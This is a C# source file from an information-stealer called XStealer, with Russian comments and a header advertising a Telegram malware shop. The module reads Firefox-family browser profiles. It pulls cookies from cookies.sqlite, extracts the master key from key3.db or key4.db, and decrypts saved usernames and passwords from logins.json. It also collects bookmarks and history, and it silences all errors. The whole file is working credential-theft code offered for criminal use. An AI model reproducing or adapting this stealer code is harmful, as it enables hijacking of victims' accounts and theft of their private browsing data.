// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;
    using Helpers.JsonEx;

    public static class GDataStruct
    {
        /// <summary>
        /// Метод для расшифровки Cookies и добавления расшифрованных данных из базы <b>cookies.sqlite</b> в список.
        /// </summary>
        /// <param name="paths">Путь до файла</param>
        /// <param name="table">Таблица для расшифровки</param>
        /// <returns></returns>
        public static List<Structures.Cookies_Gecko> ReadDataCookies(string paths, string table)
        {
            var lcCookies = new List<Structures.Cookies_Gecko>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(paths, table);
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string host = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1));
                    string name = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 2));
                    string value = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 3));
                    string path = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 4));
                    string expires = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 5));
                    string isSecure = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 6).ToUpper());

                    // string lastAccess = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 7)); // lastAccess
                    // string CreationTime = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 8)); // CreationTime
                    // string http = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 12)); // IsHttpOnly
                    // string RawSameSite = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 13)); // RawSameSite
                    // string SchemeMap = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 14)); // SchemeMap

                    var cook = new Structures.Cookies_Gecko
                    {
                        G_HostKey = host,
                        G_Name = name,
                        G_Value = value,
                        G_Path = path,
                        G_ExpiresUtc = expires,
                        G_IsSecure = isSecure
                    };
                    lcCookies.Add(cook);
                }
            }
            catch { }
            return lcCookies;
        }

        /// <summary>
        /// Метод для расшифровки Logins и добавления расшифрованных данных из базы <b>logins.json</b> в список.
        /// </summary>
        /// <param name="paths">Путь до файла</param>
        /// <param name="table">Таблица для расшифровки</param>
        /// <param name="browsername">Имя браузера</param>
        /// <returns></returns>
        public static List<Structures.Password_Gecko> ReadDataLogins(string paths, string table, string browsername)
        {
            // Путь до ключей
            string key3 = GlobalPaths.CombinePath(paths, "key3.db"), key4 = GlobalPaths.CombinePath(paths, "key4.db"), logins = GlobalPaths.CombinePath(paths, "logins.json");
            byte[] privatekey = null;
            // Проверяем ключи и расшифровывем их в отдельном методе
            if (File.Exists(key3)) { privatekey = GBox.Get_Old_P3k(key3); }
            if (File.Exists(key4)) { privatekey = GBox.Get_P4k(key4); }
            var pPasswords = new List<Structures.Password_Gecko>();
            // Проверяем файл logins.json
            if (File.Exists(logins))
            {
                try
                {
                    // Читаем весь текст в Json базы с логинами
                    foreach (JsonValue itema in File.ReadAllText(logins, Encoding.UTF8)?.FromJSON()[table])
                    {
                        if (itema.Count != 0)
                        {
                            // Зашифрованные поля
                            byte[] user_Enc = Convert.FromBase64String(itema["encryptedUsername"]?.ToString(false)), pass_Enc = Convert.FromBase64String(itema["encryptedPassword"]?.ToString(false));
                            if (user_Enc.Any() && pass_Enc.Any())
                            {
                                // Парсим зашифрованные данные
                                Asn1DerObject user_Obj = Asn1Der.Parse(user_Enc), pass_Obj = Asn1Der.Parse(pass_Enc);
                                // Расшифровываем данные
                                string decryptedUser = DecoderEx.TripDes_Decrypt(privatekey, user_Obj.Objects[0].Objects[1].Objects[1].ObjectData, user_Obj.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7);
                                string decryptedPwd = DecoderEx.TripDes_Decrypt(privatekey, pass_Obj.Objects[0].Objects[1].Objects[1].ObjectData, pass_Obj.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7);

                                string Host = itema["hostname"]?.ToString(); // Ссылка
                                string Login = Regex.Replace(decryptedUser, "[^\\u0020-\\u007F]", string.Empty); // Логин
                                string Passwd = Regex.Replace(decryptedPwd, "[^\\u0020-\\u007F]", string.Empty); // Пароль

                                // Проверяем что данные не пустые перед заносом в свойства
                                if (!string.IsNullOrWhiteSpace(Host) && !string.IsNullOrWhiteSpace(Login) && !string.IsNullOrWhiteSpace(Passwd))
                                {
                                    // Задаём параметры
                                    var passStruct = new Structures.Password_Gecko
                                    {
                                        G_Url = Host.Trim('"'),
                                        G_Username = Login,
                                        G_Pass = Passwd,
                                        G_App = browsername
                                    };
                                    // Добавляем в свойства
                                    pPasswords.Add(passStruct);
                                    //CounterEx.Passwords++;
                                }
                                continue;
                            }
                        }
                    }
                }
                catch { }
            }
            return pPasswords;
        }

        /// <summary>
        /// Метод для расшифровки Bookmarks и добавления расшифрованных данных из базы <b>places.sqlite</b> в список.
        /// </summary>
        /// <param name="paths">Путь до файла</param>
        /// <param name="table">Таблица для расшифровки</param>
        /// <returns></returns>
        public static List<Structures.Bookmark_Gecko> ReadDataBookmarks(string paths, string table)
        {
            var bBookmarks = new List<Structures.Bookmark_Gecko>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(paths, table);
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    var book = new Structures.Bookmark_Gecko { G_Title = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 5)) };
                    if (ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1)).Equals("0") && book.G_Title != "0") { bBookmarks.Add(book); }
                }
            }
            catch { }
            return bBookmarks;
        }

        /// <summary>
        /// Метод для расшифровки History и добавления расшифрованных данных из базы <b>places.sqlite</b> в список.
        /// </summary>
        /// <param name="paths">Путь до файла</param>
        /// <param name="table">Таблица для расшифровки</param>
        /// <returns></returns>
        public static List<Structures.History_Gecko> ReadDataHistory(string paths, string table)
        {
            var scHistory = new List<Structures.History_Gecko>();
            try
            {
                // Подключение к таблице
                var sSQLite = new SqliteEx().ReadTableFromTemp(paths, table);
                // Перебираем таблицу
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string Tittle = ConverterEx.StringToUTF8(sSQLite.GetValue(i, "title")); // 1 | title
                    string Url = ConverterEx.StringToUTF8(sSQLite.GetValue(i, "url")); // 2 | url
                    string Host = ConverterEx.StringToUTF8(sSQLite.GetValue(i, "rev_host")); // 3 | rev_host

                    var sSite = new Structures.History_Gecko
                    {
                        G_Title = Tittle.Contains("0") ? "No Tittle" : Tittle,
                        G_Url = !string.IsNullOrEmpty(Url) ? Url : "Unknown",
                        G_RevHost = Host.Contains("0") ? "No Host" : Host
                    };
                    scHistory.Add(sSite);
                }
            }
            catch { }
            return scHistory;
        }
    }
}